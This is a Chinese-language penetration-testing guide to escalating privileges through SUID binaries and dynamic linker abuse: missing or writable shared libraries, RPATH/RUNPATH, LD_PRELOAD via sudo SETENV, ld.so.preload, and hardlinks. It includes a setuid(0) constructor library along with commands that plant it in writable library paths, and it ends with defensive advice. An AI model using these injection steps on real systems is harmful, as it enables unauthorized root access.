# SUID 共享库与链接器滥用

{{#include ../../banners/hacktricks-training.md}}

通常会检查 SUID 二进制文件是否存在直接执行命令的风险，但自定义 SUID 程序也可能因动态链接器而存在漏洞。其常见原因很简单：特权可执行文件会从低权限用户能够影响的路径或配置中加载代码。<sup>[[1]](#references)</sup>

本页重点介绍通用技术模式：缺失的库、可写的库目录、`RPATH`/`RUNPATH`、通过 sudo 使用 `LD_PRELOAD`、链接器配置，以及 SUID 硬链接混淆。

有关这些检查背后的 ELF 程序头、动态段和加载器行为，请参见 [ELF 基本信息](../../binary-exploitation/basic-stack-binary-exploitation-methodology/elf-tricks.md)。

## 快速枚举

首先查找异常的 SUID 文件，并检查它们是否动态链接：<sup>[[1]](#references)[[3]](#references)</sup>

```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```

对于不熟悉的可执行文件，使用 `readelf`：[`ldd` 可能会执行不可信的 ELF interpreter](https://man7.org/linux/man-pages/man1/ldd.1.html)。`readelf` 会显示直接依赖项，因此还需单独确认 loader 实际选择的路径。<sup>[[1]](#references)[[3]](#references)</sup>

重点检查非标准位置、自定义应用程序路径、由 root 拥有但位于软件包管理目录之外的二进制文件，以及从可写目录加载的依赖项。<sup>[[1]](#references)</sup>

实用的可写性检查：

```bash
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```

## 缺失的 Shared Object 注入

一些自定义 SUID 二进制文件会尝试加载一个不存在的 shared object。如果缺失路径位于攻击者控制的目录下，该二进制文件可能会以有效用户身份加载攻击者提供的代码。<sup>[[1]](#references)</sup>

同样的边界也适用于**允许通过 sudo 执行的自定义二进制文件**：如果它对调用者可写的 home 或配置目录下的绝对 `.so` 路径调用 `dlopen()`，就可能触发这种情况。这种延迟加载的 library 可能不会出现在 `ldd` 输出和 ELF `NEEDED` 条目中。通过有限范围的 `strings` 检查，或跟踪一次**非特权**调用，可以发现尝试访问的路径；应用程序密码或菜单选项可能会控制是否进行查找。在将其视为权限提升之前，请确认有效的 sudo 规则、确切路径及其父目录权限，以及特权调用是否会执行到该查找操作。不要仅仅为了枚举 sudo 目标而调用它。

使用 `strace` 的 syscall 过滤器查找失败的 library 查找：<sup>[[2]](#references)</sup>

```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```

如果二进制文件会在可写路径中搜索 libexample.so，最小化的验证库可以使用构造函数。验证期间，请确保影响证明无害：<sup>[[6]](#references)</sup>

```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
    setuid(0);
    setgid(0);
    system("id > /tmp/suid-so-ran");
}
```

使用 binary 尝试加载的确切文件名构建它：

```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```

可利用条件并非仅仅是缺少库。攻击者还必须能够在特权 loader 会接受的路径下放置兼容的 shared object。<sup>[[1]](#references)</sup>

## 可写的库目录

有时所有依赖项都存在，但用于解析这些依赖项的某个目录可写。这可能允许替换已加载的库，或植入一个同名且优先级更高的库。<sup>[[1]](#references)</sup>

即使自定义 ELF 没有 SUID 位，且允许的 RunAs 账户不是 root，也应对**通过 sudo 允许执行**的自定义 ELF 进行同样的检查。将其 `DT_NEEDED` 条目与 loader 将解析到的库路径进行比较，然后检查调用者是否能够写入该文件，或通过可写且可搜索的父目录替换该文件。确认具体的 sudo RunAs 规则、符号链接和 ACL、loader 策略，以及目标进程是否以更高权限账户加载该库。可写的 `.so` 或依赖项名称本身只是线索；请在不运行 sudo 命令的情况下检查元数据。<sup>[[1]](#references)[[3]](#references)[[5]](#references)</sup>

检查依赖项路径：<sup>[[1]](#references)[[3]](#references)</sup>

```bash
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```

如果该目录可写，请在实验环境中采用不会影响原文件的方式验证。在运行中的主机上替换系统库，可能导致同时启动的进程使用不一致的库版本。<sup>[[8]](#references)</sup>

### chroot 中的可写库

仅使用 chroot 并不能关闭继承的文件描述符，也不能限制所有文件系统访问。如果沙箱保留了一个指向新根目录之外的目录描述符，且被隔离的进程能够解引用该描述符（例如通过可访问的 `/proc/<pid>/fd/` 条目），主机路径仍可能可达。这是文件系统边界问题，本身并不会授予 root 权限。<sup>[[11]](#references)[[12]](#references)</sup>

请单独检查被隔离的用户是否能写入一个库目录，而**从隔离环境启动的主机 root-SUID 可执行文件**会使用该目录。加载器会在进程的文件系统视图中解析依赖项，因此其中由攻击者控制的库可能以 SUID 程序的有效身份执行。请确认具体的可执行文件、其 SUID 位和挂载策略、文件描述符的目标及访问权限、隔离环境的库搜索路径，以及该程序是否确实能够访问主机可执行文件。沙箱启动器上的文件 capability、可写的隔离环境或主机 SUID 二进制文件本身都只是线索；完整利用链取决于沙箱的实现方式。<sup>[[1]](#references)[[11]](#references)[[12]](#references)</sup>

## RPATH 和 RUNPATH

`RPATH` 和 `RUNPATH` 是动态段条目，用于告知加载器从何处搜索库。当它们指向攻击者可写的目录时，在 SUID 程序中会很危险。<sup>[[1]](#references)</sup>

检测它们：<sup>[[3]](#references)[[10]](#references)</sup>

```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```

风险输出示例：

```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```

如果 `/opt/app/lib` 可写，且二进制文件需要 `libcustom.so`，攻击者可能能够在此处放置恶意的 `libcustom.so`：<sup>[[1]](#references)</sup>

```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```

`RPATH` 和 `RUNPATH` 在某些解析细节上并不相同，但在提权审查中，实际要问的问题是一样的：SUID 二进制文件是否会在攻击者可写的目录中搜索某个库名？<sup>[[1]](#references)</sup>

## LD_PRELOAD、LD_LIBRARY_PATH 和 SUID

对于普通程序，`LD_PRELOAD` 和 `LD_LIBRARY_PATH` 可以强制或影响共享对象的加载。对于 SUID 程序，动态加载器通常会进入安全执行模式，并忽略危险的环境变量。<sup>[[1]](#references)</sup>

这意味着，普通的 SUID 二进制文件通常不会仅仅因为用户可以设置 `LD_PRELOAD` 就存在漏洞：<sup>[[1]](#references)</sup>

```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```

常见的例外是：sudo 策略允许为目标命令设置命令行环境变量，例如 `SETENV` tag 或适用的 `setenv` 选项。如果目标是动态链接的，且 sudo 接受 `LD_PRELOAD=/path/to/library`，目标就可能加载由调用者控制的代码。请检查生效的规则和目标身份。在动态加载器于 SUID `sudo` 进程启动前剥除继承的 `LD_PRELOAD` 的系统上，仅将 `LD_PRELOAD` 添加到 `env_keep` 并不足够；命令行赋值是在 sudo 自身启动后由 sudo 处理的。<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

```bash
sudo -l
# Check SETENV/setenv and the target command's allowed arguments
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```

不要混淆这些情况；上面的 loader 和 sudo policy 规则已将它们区分开来：<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

- 针对普通 SUID binary 使用 `LD_PRELOAD`：通常会被 secure execution 阻止。
- 将 `LD_PRELOAD` 作为 sudo 命令行赋值传递给特权、动态链接的目标：可能可利用。
- 可写路径中缺少 `.so`：当 SUID binary 自然地加载该路径时，可利用。
- `RPATH`/`RUNPATH` 指向可写目录：当所需的库可被控制时，可利用。
- 对 `/etc/ld.so.preload` 或 linker 配置的写入权限：影响整个系统，危害严重。

## Linker Configuration

`ld.so` 使用 linker cache 和 `/etc/ld.so.preload`；`ldconfig` 会根据 `/etc/ld.so.conf` 及其包含的文件（通常位于 `/etc/ld.so.conf.d/`）构建该 cache。<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

高价值检查：

```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```

可写的链接器配置通常比单个存在漏洞的 SUID 二进制文件危害更大，因为它会影响许多动态链接的进程。`/etc/ld.so.preload` 尤其危险，因为它可以强制在特权进程中加载共享对象。<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

## SUID 硬链接混淆

硬链接可以让同一个 SUID inode 以多个名称出现。<sup>[[9]](#references)</sup> 这有助于隐藏特权辅助程序、干扰清理操作，或绕过简单的基于路径的审查。

查找链接数大于 1 的 SUID 文件：<sup>[[9]](#references)</sup>

```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```

检查指向同一 inode 的所有路径：<sup>[[9]](#references)</sup>

```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```

这种滥用并不是 hardlink 会更改权限，而是路径混淆：特权 inode 可能通过防御人员或脚本意料之外的名称访问。<sup>[[9]](#references)</sup> 有关 inode 和 hardlink 工作流程的深入说明，请参阅 [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md)。

## Defensive Notes

- 尽可能精简 SUID binaries，并对其进行审计和由软件包管理。
- 避免将 `RPATH`/`RUNPATH` 指向可写目录或由应用程序管理的目录。<sup>[[1]](#references)[[8]](#references)</sup>
- 确保库目录由 root 拥有，且普通用户无法写入。<sup>[[8]](#references)</sup>
- 不要通过 sudo 保留 `LD_PRELOAD`、`LD_LIBRARY_PATH` 或类似的 loader 变量。<sup>[[1]](#references)[[5]](#references)</sup>
- 监控 `/etc/ld.so.preload`、`/etc/ld.so.conf`、`/etc/ld.so.conf.d/` 以及异常的 SUID 文件。<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
- 检查存在 hardlink 的 SUID 文件，并调查标准系统路径之外的自定义 SUID wrappers。<sup>[[9]](#references)</sup>

## References

- [1] [ld.so(8) — Linux 手册页](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [strace(1) — Linux 手册页](https://man7.org/linux/man-pages/man1/strace.1.html)
- [3] [readelf（GNU Binary Utilities）](https://sourceware.org/binutils/docs/binutils/readelf.html)
- [4] [sudo(8) — Linux 手册页](https://www.man7.org/linux/man-pages/man8/sudo.8.html)
- [5] [sudoers(5) — Linux 手册页](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [6] [常用属性（GCC）](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [7] [ldconfig(8) — Linux 手册页](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [8] [Dynamic Linker 加固（GNU C Library）](https://www.sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [9] [Hard Links（GNU Findutils）](https://www.gnu.org/software/findutils/manual/html_node/find_html/Hard-Links.html)
- [10] [objdump（GNU Binary Utilities）](https://www.sourceware.org/binutils/docs/binutils/objdump.html)
- [11] [chroot(2) — Linux 手册页](https://man7.org/linux/man-pages/man2/chroot.2.html)
- [12] [proc_pid_fd(5) — Linux 手册页](https://man7.org/linux/man-pages/man5/proc_pid_fd.5.html)
{{#include ../../banners/hacktricks-training.md}}
